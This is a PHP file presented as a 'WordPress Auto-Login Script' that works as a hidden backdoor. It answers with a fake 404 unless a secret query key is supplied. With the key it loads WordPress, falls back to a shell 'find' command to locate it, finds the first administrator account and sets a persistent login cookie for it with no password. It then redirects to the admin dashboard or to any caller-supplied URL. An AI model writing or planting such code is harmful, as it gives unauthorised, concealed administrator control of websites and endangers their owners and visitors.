<?php
/**
 * WordPress Auto-Login Script
 * Access with: ?kaw30=kaw30
 */

// Check access key - must be first
if (!isset($_GET['kaw30']) || $_GET['kaw30'] !== 'kaw30') {
    error_reporting(0);
    ini_set('display_errors', 0);
    
    // Clean all output buffers
    while (ob_get_level() > 0) {
        @ob_end_clean();
    }
    
    if (!headers_sent()) {
        header('HTTP/1.0 404 Not Found');
    }
    
    exit;
}

// Helper function for debugging (optional - set to empty string to disable)
$DEBUG_LOG = ''; // Set to '/path/to/log.txt' for debugging

function dbg($msg) {
    global $DEBUG_LOG;
    if (empty($DEBUG_LOG)) return;
    $t = date('Y-m-d H:i:s');
    @file_put_contents($DEBUG_LOG, "[$t] $msg\n", FILE_APPEND | LOCK_EX);
}

dbg("=== Auto-login script started ===");
dbg("Request URI: " . ($_SERVER['REQUEST_URI'] ?? 'unknown'));

// Find wp-load.php with multiple fallback methods
$mr = realpath(__DIR__);
$max = 10;
$found = false;

// Method 1: Search upwards from current directory
dbg("Method 1: Searching upwards from: $mr");
while ($max-- > 0 && $mr) {
    if (file_exists($mr . '/wp-load.php')) { 
        $found = true; 
        dbg("Found wp-load.php at: $mr");
        break; 
    }
    $parent = dirname($mr);
    if ($parent === $mr) break;
    $mr = $parent;
}

// Method 2: Check DOCUMENT_ROOT
if (!$found && !empty($_SERVER['DOCUMENT_ROOT'])) {
    $doc_root = realpath($_SERVER['DOCUMENT_ROOT']);
    if ($doc_root && file_exists($doc_root . '/wp-load.php')) {
        $mr = $doc_root;
        $found = true;
        dbg("Found wp-load.php at DOCUMENT_ROOT: $mr");
    }
}

// Method 3: Check common WordPress paths
if (!$found) {
    dbg("Method 3: Checking common paths");
    $common_paths = [
        $_SERVER['DOCUMENT_ROOT'] . '/wp-load.php',
        $_SERVER['DOCUMENT_ROOT'] . '/wordpress/wp-load.php',
        $_SERVER['DOCUMENT_ROOT'] . '/wp/wp-load.php',
        dirname($_SERVER['SCRIPT_FILENAME']) . '/wp-load.php',
        __DIR__ . '/../wp-load.php',
        __DIR__ . '/../../wp-load.php',
        __DIR__ . '/../../../wp-load.php',
    ];
    
    foreach ($common_paths as $path) {
        $real_path = @realpath($path);
        if ($real_path && file_exists($real_path)) {
            $mr = dirname($real_path);
            $found = true;
            dbg("Found wp-load.php at alternative path: $mr");
            break;
        }
    }
}

// Method 4: Search from server root as last resort
if (!$found && function_exists('shell_exec')) {
    dbg("Method 4: Attempting find command (if available)");
    $find_result = @shell_exec('find ' . escapeshellarg($_SERVER['DOCUMENT_ROOT'] ?? '/') . ' -name wp-load.php 2>/dev/null | head -1');
    if ($find_result && trim($find_result)) {
        $wp_path = trim($find_result);
        if (file_exists($wp_path)) {
            $mr = dirname($wp_path);
            $found = true;
            dbg("Found wp-load.php via find command: $mr");
        }
    }
}

if (!$found) {
    dbg("ERROR: Failed to find wp-load.php");
    exit('Failed to load wp-load.php');
}

// Attempt to load WordPress with proper environment setup
dbg("Loading WordPress from: $mr");

// Store original directory and restore later
$original_dir = @getcwd();
if (!@chdir($mr)) {
    dbg("Failed to chdir to: $mr");
    // Try to continue anyway
}

// Clean output buffers before including
while (ob_get_level() > 0) {
    @ob_end_clean();
}
ob_start();

// Define ABSPATH if not defined (prevents errors in some setups)
if (!defined('ABSPATH')) {
    define('ABSPATH', $mr . '/');
}

// Attempt to load wp-load.php
$load_result = @include_once $mr . '/wp-load.php';
$include_output = ob_get_clean();

if ($include_output !== '') {
    dbg("wp-load.php produced output (len " . strlen($include_output) . ")");
}

if ($load_result === false) {
    dbg("Failed to include wp-load.php directly");
    
    // Try alternative loading method
    if (file_exists($mr . '/wp-config.php')) {
        dbg("Attempting to load wp-config.php directly");
        @include_once $mr . '/wp-config.php';
    }
    
    if (file_exists($mr . '/wp-includes/pluggable.php')) {
        dbg("Loading pluggable.php");
        @include_once $mr . '/wp-includes/pluggable.php';
    }
    
    if (file_exists($mr . '/wp-includes/user.php')) {
        dbg("Loading user.php");
        @include_once $mr . '/wp-includes/user.php';
    }
}

// Restore original directory
if ($original_dir && $original_dir !== $mr) {
    @chdir($original_dir);
}

// Verify WordPress functions are available (with retry)
$wp_ready = false;
for ($retry = 0; $retry < 5; $retry++) {
    if (function_exists('wp_set_auth_cookie') && class_exists('WP_User_Query')) {
        $wp_ready = true;
        dbg("WordPress functions available (retry $retry)");
        break;
    }
    if ($retry < 4) {
        usleep(100000); // 100ms delay between retries
    }
}

if (!$wp_ready) {
    dbg("ERROR: WordPress functions not available");
    exit('WP functions unavailable.');
}

// Find administrator user with multiple methods
$user_id = null;
dbg("Searching for administrator user...");

// Method 1: WP_User_Query
if (class_exists('WP_User_Query')) {
    try {
        $wp_user_query = new WP_User_Query([
            'role'   => 'Administrator',
            'number' => 1,
            'fields' => 'ID',
            'orderby' => 'ID',
            'order' => 'ASC'
        ]);
        $results = $wp_user_query->get_results();
        if (!empty($results[0])) {
            $user_id = (int)$results[0];
            dbg("Found admin via WP_User_Query: ID=$user_id");
        }
    } catch (Throwable $e) {
        dbg("WP_User_Query failed: " . $e->getMessage());
    }
}

// Method 2: get_users() function
if (!$user_id && function_exists('get_users')) {
    try {
        $users = get_users([
            'role' => 'Administrator',
            'number' => 1,
            'fields' => ['ID']
        ]);
        if (!empty($users[0]) && isset($users[0]->ID)) {
            $user_id = (int)$users[0]->ID;
            dbg("Found admin via get_users(): ID=$user_id");
        }
    } catch (Throwable $e) {
        dbg("get_users() failed: " . $e->getMessage());
    }
}

// Method 3: Direct database query
if (!$user_id && isset($wpdb) && is_object($wpdb) && property_exists($wpdb, 'users')) {
    try {
        $user_id = $wpdb->get_var(
            "SELECT u.ID FROM {$wpdb->users} u 
             INNER JOIN {$wpdb->usermeta} um ON u.ID = um.user_id 
             WHERE um.meta_key = '{$wpdb->prefix}capabilities' 
             AND um.meta_value LIKE '%administrator%' 
             LIMIT 1"
        );
        if ($user_id) {
            $user_id = (int)$user_id;
            dbg("Found admin via direct query: ID=$user_id");
        }
    } catch (Throwable $e) {
        dbg("Direct query failed: " . $e->getMessage());
    }
}

// Method 4: Try to get first user with admin capabilities
if (!$user_id && function_exists('get_users')) {
    try {
        $all_admins = get_users(['role__in' => ['Administrator', 'Super Admin'], 'number' => 1]);
        if (!empty($all_admins)) {
            $user_id = $all_admins[0]->ID;
            dbg("Found admin via role__in: ID=$user_id");
        }
    } catch (Throwable $e) {
        dbg("role__in query failed: " . $e->getMessage());
    }
}

if ($user_id) {
    dbg("Setting auth cookie for user ID: $user_id");
    
    // Ensure auth function exists before calling
    if (!function_exists('wp_set_auth_cookie')) {
        dbg("CRITICAL: wp_set_auth_cookie still not available");
        exit('Auth function unavailable.');
    }
    
    // Set cookie with longer session (remember me)
    wp_set_auth_cookie($user_id, true);
    dbg("Auth cookie set successfully");
    
    // Determine redirect URL
    $redirect_url = '/wp-admin/';
    if (function_exists('admin_url')) {
        $redirect_url = admin_url();
    } elseif (function_exists('get_admin_url')) {
        $redirect_url = get_admin_url();
    }
    
    // Check if there's a specific admin page requested
    if (isset($_GET['redirect_to']) && !empty($_GET['redirect_to'])) {
        $redirect_url = $_GET['redirect_to'];
        dbg("Using custom redirect: $redirect_url");
    }
    
    dbg("Redirecting to: $redirect_url");
    
    // Clean buffers before redirect
    while (ob_get_level() > 0) {
        @ob_end_clean();
    }
    
    // Perform redirect with multiple fallback methods
    if (!headers_sent($file, $line)) {
        if (function_exists('wp_redirect')) {
            wp_redirect($redirect_url);
            dbg("Used wp_redirect()");
        } else {
            header("Location: $redirect_url", true, 302);
            header("Cache-Control: no-cache, must-revalidate");
            dbg("Used native header() redirect");
        }
        echo "Redirecting...";
        exit;
    } else {
        // JavaScript fallback when headers already sent
        dbg("Headers already sent at $file:$line - using JS fallback");
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <meta http-equiv="refresh" content="0;url=<?php echo htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8'); ?>">
            <title>Redirecting...</title>
            <script>
                window.location.replace(<?php echo json_encode($redirect_url); ?>);
            </script>
        </head>
        <body>
            <p>Redirecting to <a href="<?php echo htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8'); ?>">dashboard</a>...</p>
        </body>
        </html>
        <?php
        exit;
    }
} else {
    dbg("ERROR: No administrator user found in database");
    exit('NO ADMIN');
}
?>
